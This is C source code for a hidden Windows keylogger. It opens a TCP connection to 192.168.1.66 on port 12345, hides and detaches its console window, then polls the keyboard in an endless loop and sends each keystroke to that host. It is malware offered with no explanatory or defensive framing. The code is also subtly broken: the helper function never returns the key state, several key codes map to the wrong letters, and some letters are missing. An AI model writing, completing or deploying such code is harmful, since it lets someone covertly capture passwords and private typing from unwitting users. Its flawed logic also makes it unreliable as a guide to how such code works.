#define _WIN32_WINNT 0x0500

#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <windows.h>

int G(int a){
    GetAsyncKeyState(a);
}

int main(){
    int conn;
    SOCKET sock;
    struct sockaddr_in sockadres;
    int serv;
    char buffer[1024];
    PROCESS_INFORMATION pi;
    WSADATA wsa;
    STARTUPINFO si;

    WSAStartup(MAKEWORD(2,0),&wsa);

    sock=WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,0,0);

    sockadres.sin_addr.s_addr=inet_addr("192.168.1.66");
    sockadres.sin_family=AF_INET;
    sockadres.sin_port=htons(12345);

    conn=WSAConnect(sock,(struct sockaddr*)&sockadres,sizeof(sockadres),NULL,NULL,NULL,NULL);
    
    HWND hwnd=GetConsoleWindow();
    //ShowWindow(hwnd,SW_MINIMIZE); //wont hide the window, minimise
    ShowWindow(hwnd,SW_HIDE);

    FreeConsole();

    while(1){

        Sleep(140);
        //Numbers ranging from 48 - 57
        if(G(48) || G(96)){
            send(sock,"0",sizeof("0"),0);
        }
        else if(G(49) || G(97)){
            send(sock,"1",sizeof("1"),0);
        }
        else if(G(50) || G(98)){
            send(sock,"2",sizeof("2"),0);
        }
        else if(G(51) || G(99)){
            send(sock,"3",sizeof("3"),0);
        }
        else if(G(52) || G(100)){
            send(sock,"4",sizeof("4"),0);
        }
        else if(G(53) || G(101)){
            send(sock,"5",sizeof("5"),0);
        }
        else if(G(54) || G(102)){
            send(sock,"6",sizeof("6"),0);
        }
        else if(G(55) || G(103)){
            send(sock,"7",sizeof("7"),0);
        }
        else if(G(56) || G(104)){
            send(sock,"8",sizeof("8"),0);
        }
        else if(G(57) || G(105)){
            send(sock,"9",sizeof("9"),0);
        }
        //Alphabets Uppercase from 65-90
        else if(G(65)){
            send(sock,"a",sizeof("a"),0);
        }
        else if(G(66)){
            send(sock,"b",sizeof("b"),0);
        }
        else if(G(67)){
            send(sock,"c",sizeof("c"),0);
        }
        else if(G(68)){
            send(sock,"d",sizeof("d"),0);
        }
        else if(G(69)){
            send(sock,"e",sizeof("e"),0);
        }
        else if(G(70)){
            send(sock,"f",sizeof("f"),0);
        }
        else if(G(71)){
            send(sock,"g",sizeof("g"),0);
        }
        else if(G(72)){
            send(sock,"h",sizeof("h"),0);
        }
        else if(G(73)){
            send(sock,"j",sizeof("j"),0);
        }
        else if(G(74)){
            send(sock,"k",sizeof("k"),0);
        }
        else if(G(75)){
            send(sock,"l",sizeof("l"),0);
        }
        else if(G(76)){
            send(sock,"m",sizeof("m"),0);
        }
        else if(G(77)){
            send(sock,"n",sizeof("n"),0);
        }
        else if(G(79)){
            send(sock,"o",sizeof("o"),0);
        }
        else if(G(80)){
            send(sock,"w",sizeof("w"),0);
        }
        else if(G(81)){
            send(sock,"p",sizeof("p"),0);
        }
        else if(G(82)){
            send(sock,"r",sizeof("r"),0);
        }
        else if(G(83)){
            send(sock,"s",sizeof("s"),0);
        }
        else if(G(84)){
            send(sock,"t",sizeof("t"),0);
        }
        else if(G(85)){
            send(sock,"y",sizeof("y"),0);
        }
        else if(G(86)){
            send(sock,"u",sizeof("u"),0);
        }
        else if(G(87)){
            send(sock,"ü",sizeof("ü"),0);
        }
        else if(G(88)){
            send(sock,"v",sizeof("v"),0);
        }
        else if(G(89)){
            send(sock,"y",sizeof("y"),0);
        }
        else if(G(90)){
            send(sock,"z",sizeof("z"),0);
        }
        //special characters 
        else if(G(32)){
            send(sock,"<space>",sizeof("<space>"),0);
        } //space
        else if(G(8)){
            send(sock,"<back_space>",sizeof("<back_space>"),0);
        } //backspace
        else if(G(13)){
            send(sock,"<enter>",sizeof("<enter>"),0);
        } //enter
        else if(G(16)){
            send(sock,"<shift>",sizeof("<shift>"),0);
        }
        else if(G(20)){
            send(sock,"<caps_lock>",sizeof("<caps_lock>"),0);
        }
    }
 
}
